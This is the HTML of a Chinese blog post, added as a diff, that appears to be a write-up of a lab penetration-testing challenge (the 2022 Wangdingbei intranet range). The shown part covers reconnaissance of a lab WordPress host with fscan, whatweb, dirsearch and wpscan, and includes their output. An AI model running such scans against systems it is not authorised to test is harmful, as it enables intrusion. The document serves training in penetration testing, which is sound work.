@@ -1,0 +1,969 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/chongqing.jpg">
+  <link rel="icon" href="/img/chongqing.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="sangnigege">
+  <meta name="keywords" content="一个做事不将就的人，阻止他的只有时间">
+  
+    <meta name="description" content="前言 本文所使用的工具可参考以下仓库： Awesome_Pentest_Tools: 一站式渗透测试与红队工具合集，旨在帮助渗透测试人员打造自己的工具链  靶标介绍： 该靶场为 2022 第三届网鼎杯决赛内网靶场复盘。完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云镜 2022网鼎杯半决赛复盘">
+<meta property="og:url" content="http://example.com/2026/test54/index.html">
+<meta property="og:site_name" content="重庆森林不在重庆">
+<meta property="og:description" content="前言 本文所使用的工具可参考以下仓库： Awesome_Pentest_Tools: 一站式渗透测试与红队工具合集，旨在帮助渗透测试人员打造自己的工具链  靶标介绍： 该靶场为 2022 第三届网鼎杯决赛内网靶场复盘。完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152210984.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152210806.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152210431.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152210436.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152211293.png">
+<meta property="article:published_time" content="2026-04-15T10:16:15.725Z">
+<meta property="article:modified_time" content="2026-04-15T14:32:10.998Z">
+<meta property="article:author" content="sangnigege">
+<meta property="article:tag" content="春秋云镜">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152210984.png">
+  
+  
+  
+  <title>春秋云镜 2022网鼎杯半决赛复盘 - 重庆森林不在重庆</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","app_key":"rSHs3EnI9lT7nQwv5J7fcBnq","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>重庆森林不在重庆</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="春秋云镜 2022网鼎杯半决赛复盘"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-15 18:16" pubdate>
+          2026年4月15日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          41 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">春秋云镜 2022网鼎杯半决赛复盘</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
+<p>本文所使用的工具可参考以下仓库：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/sangnigege/Awesome_Pentest_Tools">Awesome_Pentest_Tools: 一站式渗透测试与红队工具合集，旨在帮助渗透测试人员打造自己的工具链</a></p>
+</blockquote>
+<p><em>靶标介绍：</em></p>
+<p>该靶场为 2022 第三届网鼎杯决赛内网靶场复盘。完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有 4 个 flag，分布于不同的靶机。</p>
+<h1 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h1><p>借用一张拓扑图</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152210984.png" srcset="/img/loading.gif" lazyload alt="2ea9a44f0978d2b1f4d1c764ac078687"></p>
+<p>fscan扫一下</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">./fscan -h 39.99.151.78<br><br>   ___                              _    <br>  / _ \     ___  ___ _ __ __ _  ___|<span class="hljs-string"> </span>|<span class="hljs-string"> __ </span><br><span class="hljs-string"> / /_\/____/ __</span>|<span class="hljs-string">/ __</span>|<span class="hljs-string"> &#x27;__/ _` </span>|<span class="hljs-string">/ __</span>|<span class="hljs-string"> </span>|<span class="hljs-string">/ /</span><br><span class="hljs-string">/ /_\\_____\__ \ (__</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> (_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> (__</span>|<span class="hljs-string">   &lt;    </span><br><span class="hljs-string">\____/     </span>|<span class="hljs-string">___/\___</span>|<span class="hljs-string">_</span>|<span class="hljs-string">  \__,_</span>|<span class="hljs-string">\___</span>|<span class="hljs-string">_</span>|<span class="hljs-string">\_\   </span><br><span class="hljs-string">                     fscan version: 1.8.4</span><br><span class="hljs-string">start infoscan</span><br><span class="hljs-string">39.99.151.78:22 open</span><br><span class="hljs-string">39.99.151.78:80 open</span><br><span class="hljs-string">[*] alive ports len is: 2</span><br><span class="hljs-string">start vulscan</span><br><span class="hljs-string">[*] WebTitle http://39.99.151.78      code:200 len:39988  title:XIAORANG.LAB</span><br><span class="hljs-string">已完成 2/2</span><br><span class="hljs-string">[*] 扫描结束,耗时: 32.499900035s</span><br></code></pre></td></tr></table></figure>
+
+<p>没什么用，识别一下网站技术栈和特征，得到<code>WordPress[6.2.7]</code></p>
+<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs inform7">whatweb 39.99.151.78 <br>http://39.99.151.78 <span class="hljs-comment">[200 OK]</span> Apache<span class="hljs-comment">[2.4.41]</span>, Country<span class="hljs-comment">[HONG KONG]</span><span class="hljs-comment">[HK]</span>, Email<span class="hljs-comment">[wordpress@example.com]</span>, HTML5, HTTPServer<span class="hljs-comment">[Ubuntu Linux]</span><span class="hljs-comment">[Apache/2.4.41 (Ubuntu)]</span>, IP<span class="hljs-comment">[39.99.151.78]</span>, MetaGenerator<span class="hljs-comment">[WordPress 6.2.7]</span>, PoweredBy<span class="hljs-comment">[--]</span>, Script, Title<span class="hljs-comment">[XIAORANG.LAB]</span>, UncommonHeaders<span class="hljs-comment">[link]</span>, WordPress<span class="hljs-comment">[6.2.7]</span><br></code></pre></td></tr></table></figure>
+
+<p>再目录扫描一下</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs nix">dirsearch <span class="hljs-operator">-</span>u http:<span class="hljs-operator">//</span><span class="hljs-number">39.99</span>.<span class="hljs-number">151.78</span><span class="hljs-symbol">/</span><br><br>  _|. _ _  _  _  _ _|_    v0.<span class="hljs-number">4.3</span>                                                                                                                    <br> (_<span class="hljs-operator">||</span>| _) (<span class="hljs-operator">/</span>_(_<span class="hljs-operator">||</span> (_| )                                                                                                                  <br><span class="hljs-params">Extensions:</span> php, aspx, jsp, html, js | HTTP <span class="hljs-params">method:</span> GET | <span class="hljs-params">Threads:</span> <span class="hljs-number">25</span> | Wordlist <span class="hljs-params">size:</span> <span class="hljs-number">11460</span><br><br>Output <span class="hljs-params">File:</span> <span class="hljs-symbol">/home/matrix/Desktop/reports/http_39.99.151.78/__25-08-28_23-18-43.txt</span><br><br><span class="hljs-params">Target:</span> http:<span class="hljs-operator">//</span><span class="hljs-number">39.99</span>.<span class="hljs-number">151.78</span><span class="hljs-symbol">/</span><br><br>[<span class="hljs-number">23</span>:<span class="hljs-number">18</span>:<span class="hljs-number">43</span>] <span class="hljs-params">Starting:</span>                                                                                                                                <br>[<span class="hljs-number">23</span>:<span class="hljs-number">18</span>:<span class="hljs-number">46</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">277</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.ht_wsr.txt</span>                                      <br>[<span class="hljs-number">23</span>:<span class="hljs-number">18</span>:<span class="hljs-number">46</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">277</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess.bak1</span>                                   <br>[<span class="hljs-number">23</span>:<span class="hljs-number">18</span>:<span class="hljs-number">46</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">277</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess.sample</span>                                 <br>[<span class="hljs-number">23</span>:<span class="hljs-number">18</span>:<span class="hljs-number">46</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">277</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess.orig</span><br>[<span class="hljs-number">23</span>:<span class="hljs-number">18</span>:<span class="hljs-number">46</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">277</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess.save</span><br>[<span class="hljs-number">23</span>:<span class="hljs-number">18</span>:<span class="hljs-number">46</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">277</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess_extra</span>                                  <br>[<span class="hljs-number">23</span>:<span class="hljs-number">18</span>:<span class="hljs-number">46</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">277</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess_orig</span><br>[<span class="hljs-number">23</span>:<span class="hljs-number">18</span>:<span class="hljs-number">46</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">277</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess_sc</span><br>[<span class="hljs-number">23</span>:<span class="hljs-number">18</span>:<span class="hljs-number">46</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">277</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccessBAK</span><br>[<span class="hljs-number">23</span>:<span class="hljs-number">18</span>:<span class="hljs-number">46</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">277</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccessOLD</span><br>[<span class="hljs-number">23</span>:<span class="hljs-number">18</span>:<span class="hljs-number">46</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">277</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccessOLD2</span><br>[<span class="hljs-number">23</span>:<span class="hljs-number">18</span>:<span class="hljs-number">46</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">277</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htm</span>                                             <br>[<span class="hljs-number">23</span>:<span class="hljs-number">18</span>:<span class="hljs-number">46</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">277</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.html</span><br>[<span class="hljs-number">23</span>:<span class="hljs-number">18</span>:<span class="hljs-number">46</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">277</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htpasswd_test</span>                                   <br>[<span class="hljs-number">23</span>:<span class="hljs-number">18</span>:<span class="hljs-number">46</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">277</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htpasswds</span><br>[<span class="hljs-number">23</span>:<span class="hljs-number">18</span>:<span class="hljs-number">46</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">277</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.httr-oauth</span><br>[<span class="hljs-number">23</span>:<span class="hljs-number">18</span>:<span class="hljs-number">47</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">277</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.php</span>                                             <br>[<span class="hljs-number">23</span>:<span class="hljs-number">19</span>:<span class="hljs-number">00</span>] <span class="hljs-number">301</span> <span class="hljs-operator">-</span>    <span class="hljs-number">0</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/index.php</span>  <span class="hljs-operator">-&gt;</span>  http:<span class="hljs-operator">//</span><span class="hljs-number">39.99</span>.<span class="hljs-number">151.78</span><span class="hljs-symbol">/</span>              <br>[<span class="hljs-number">23</span>:<span class="hljs-number">19</span>:<span class="hljs-number">00</span>] <span class="hljs-number">404</span> <span class="hljs-operator">-</span>   <span class="hljs-number">35</span>KB <span class="hljs-operator">-</span> <span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>login<span class="hljs-symbol">/</span>                                 <br>[<span class="hljs-number">23</span>:<span class="hljs-number">19</span>:<span class="hljs-number">01</span>] <span class="hljs-number">200</span> <span class="hljs-operator">-</span>    <span class="hljs-number">7</span>KB <span class="hljs-operator">-</span> <span class="hljs-symbol">/license.txt</span>                                      <br>[<span class="hljs-number">23</span>:<span class="hljs-number">19</span>:<span class="hljs-number">06</span>] <span class="hljs-number">200</span> <span class="hljs-operator">-</span>    <span class="hljs-number">3</span>KB <span class="hljs-operator">-</span> <span class="hljs-symbol">/readme.html</span>                                      <br>[<span class="hljs-number">23</span>:<span class="hljs-number">19</span>:<span class="hljs-number">07</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">277</span>B  <span class="hljs-operator">-</span> <span class="hljs-operator">/</span>server-status<span class="hljs-symbol">/</span>                                   <br>[<span class="hljs-number">23</span>:<span class="hljs-number">19</span>:<span class="hljs-number">07</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">277</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/server-status</span>                                    <br>[<span class="hljs-number">23</span>:<span class="hljs-number">19</span>:<span class="hljs-number">13</span>] <span class="hljs-number">301</span> <span class="hljs-operator">-</span>  <span class="hljs-number">315</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/wp-admin</span>  <span class="hljs-operator">-&gt;</span>  http:<span class="hljs-operator">//</span><span class="hljs-number">39.99</span>.<span class="hljs-number">151.78</span><span class="hljs-operator">/</span>wp-admin<span class="hljs-symbol">/</span>      <br>[<span class="hljs-number">23</span>:<span class="hljs-number">19</span>:<span class="hljs-number">13</span>] <span class="hljs-number">400</span> <span class="hljs-operator">-</span>    <span class="hljs-number">1</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/wp-admin/admin-ajax.php</span>                          <br>[<span class="hljs-number">23</span>:<span class="hljs-number">19</span>:<span class="hljs-number">13</span>] <span class="hljs-number">409</span> <span class="hljs-operator">-</span>    <span class="hljs-number">3</span>KB <span class="hljs-operator">-</span> <span class="hljs-symbol">/wp-admin/setup-config.php</span>                        <br>[<span class="hljs-number">23</span>:<span class="hljs-number">19</span>:<span class="hljs-number">13</span>] <span class="hljs-number">200</span> <span class="hljs-operator">-</span>    <span class="hljs-number">0</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/wp-config.php</span>                                    <br>[<span class="hljs-number">23</span>:<span class="hljs-number">19</span>:<span class="hljs-number">13</span>] <span class="hljs-number">302</span> <span class="hljs-operator">-</span>    <span class="hljs-number">0</span>B  <span class="hljs-operator">-</span> <span class="hljs-operator">/</span>wp-admin<span class="hljs-symbol">/</span>  <span class="hljs-operator">-&gt;</span>  http:<span class="hljs-operator">//</span><span class="hljs-number">39.99</span>.<span class="hljs-number">151.78</span><span class="hljs-operator">/</span>wp-login.php<span class="hljs-operator">?</span>redirect_to<span class="hljs-operator">=</span>http%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F39.<span class="hljs-number">99.151</span>.<span class="hljs-number">78</span>%<span class="hljs-number">2</span>Fwp-admin%<span class="hljs-number">2</span>F&amp;reauth<span class="hljs-operator">=</span><span class="hljs-number">1</span><br>[<span class="hljs-number">23</span>:<span class="hljs-number">19</span>:<span class="hljs-number">13</span>] <span class="hljs-number">200</span> <span class="hljs-operator">-</span>  <span class="hljs-number">512</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/wp-admin/install.php</span><br>[<span class="hljs-number">23</span>:<span class="hljs-number">19</span>:<span class="hljs-number">13</span>] <span class="hljs-number">301</span> <span class="hljs-operator">-</span>  <span class="hljs-number">317</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/wp-content</span>  <span class="hljs-operator">-&gt;</span>  http:<span class="hljs-operator">//</span><span class="hljs-number">39.99</span>.<span class="hljs-number">151.78</span><span class="hljs-operator">/</span>wp-content<span class="hljs-symbol">/</span>  <br>[<span class="hljs-number">23</span>:<span class="hljs-number">19</span>:<span class="hljs-number">13</span>] <span class="hljs-number">200</span> <span class="hljs-operator">-</span>    <span class="hljs-number">0</span>B  <span class="hljs-operator">-</span> <span class="hljs-operator">/</span>wp-content<span class="hljs-symbol">/</span>                                      <br>[<span class="hljs-number">23</span>:<span class="hljs-number">19</span>:<span class="hljs-number">13</span>] <span class="hljs-number">200</span> <span class="hljs-operator">-</span>   <span class="hljs-number">84</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/wp-content/plugins/akismet/akismet.php</span>           <br>[<span class="hljs-number">23</span>:<span class="hljs-number">19</span>:<span class="hljs-number">13</span>] <span class="hljs-number">500</span> <span class="hljs-operator">-</span>    <span class="hljs-number">0</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/wp-content/plugins/hello.php</span>                     <br>[<span class="hljs-number">23</span>:<span class="hljs-number">19</span>:<span class="hljs-number">13</span>] <span class="hljs-number">200</span> <span class="hljs-operator">-</span>  <span class="hljs-number">415</span>B  <span class="hljs-operator">-</span> <span class="hljs-operator">/</span>wp-content<span class="hljs-operator">/</span>upgrade<span class="hljs-symbol">/</span>                              <br>[<span class="hljs-number">23</span>:<span class="hljs-number">19</span>:<span class="hljs-number">13</span>] <span class="hljs-number">200</span> <span class="hljs-operator">-</span>  <span class="hljs-number">477</span>B  <span class="hljs-operator">-</span> <span class="hljs-operator">/</span>wp-content<span class="hljs-operator">/</span>uploads<span class="hljs-symbol">/</span>                              <br>[<span class="hljs-number">23</span>:<span class="hljs-number">19</span>:<span class="hljs-number">13</span>] <span class="hljs-number">200</span> <span class="hljs-operator">-</span>    <span class="hljs-number">0</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/wp-includes/rss-functions.php</span>                    <br>[<span class="hljs-number">23</span>:<span class="hljs-number">19</span>:<span class="hljs-number">13</span>] <span class="hljs-number">301</span> <span class="hljs-operator">-</span>  <span class="hljs-number">318</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/wp-includes</span>  <span class="hljs-operator">-&gt;</span>  http:<span class="hljs-operator">//</span><span class="hljs-number">39.99</span>.<span class="hljs-number">151.78</span><span class="hljs-operator">/</span>wp-includes<span class="hljs-symbol">/</span><br>[<span class="hljs-number">23</span>:<span class="hljs-number">19</span>:<span class="hljs-number">13</span>] <span class="hljs-number">200</span> <span class="hljs-operator">-</span>    <span class="hljs-number">0</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/wp-cron.php</span>                                      <br>[<span class="hljs-number">23</span>:<span class="hljs-number">19</span>:<span class="hljs-number">13</span>] <span class="hljs-number">302</span> <span class="hljs-operator">-</span>    <span class="hljs-number">0</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/wp-signup.php</span>  <span class="hljs-operator">-&gt;</span>  http:<span class="hljs-operator">//</span><span class="hljs-number">39.99</span>.<span class="hljs-number">151.78</span><span class="hljs-operator">/</span>wp-login.php<span class="hljs-operator">?</span>action<span class="hljs-operator">=</span>register<br>[<span class="hljs-number">23</span>:<span class="hljs-number">19</span>:<span class="hljs-number">13</span>] <span class="hljs-number">200</span> <span class="hljs-operator">-</span>    <span class="hljs-number">2</span>KB <span class="hljs-operator">-</span> <span class="hljs-symbol">/wp-login.php</span><br>[<span class="hljs-number">23</span>:<span class="hljs-number">19</span>:<span class="hljs-number">13</span>] <span class="hljs-number">200</span> <span class="hljs-operator">-</span>    <span class="hljs-number">5</span>KB <span class="hljs-operator">-</span> <span class="hljs-operator">/</span>wp-includes<span class="hljs-symbol">/</span>                                     <br>[<span class="hljs-number">23</span>:<span class="hljs-number">19</span>:<span class="hljs-number">13</span>] <span class="hljs-number">405</span> <span class="hljs-operator">-</span>   <span class="hljs-number">42</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/xmlrpc.php</span>                                       <br>                                                                             <br>Task Completed           <br></code></pre></td></tr></table></figure>
+
+<p>利用wordpress的杀器<code>wpscan</code>，但没拿到有用数据</p>
